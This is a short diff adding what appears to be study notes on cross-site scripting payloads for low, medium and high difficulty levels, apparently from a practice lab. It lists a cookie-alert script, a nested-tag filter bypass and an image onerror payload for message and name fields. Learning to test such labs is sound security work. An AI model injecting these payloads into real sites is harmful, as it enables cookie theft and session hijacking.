@@ -1,0 +1,12 @@
+LOW : 
+
+In message : <script>alert(document.cookie)</script>
+
+MEDIUM : 
+
+In name
+<sc<script>ript>alert(1)</script>
+
+HIGH : 
+In name: 
+<img src/onerror=alert(1)>
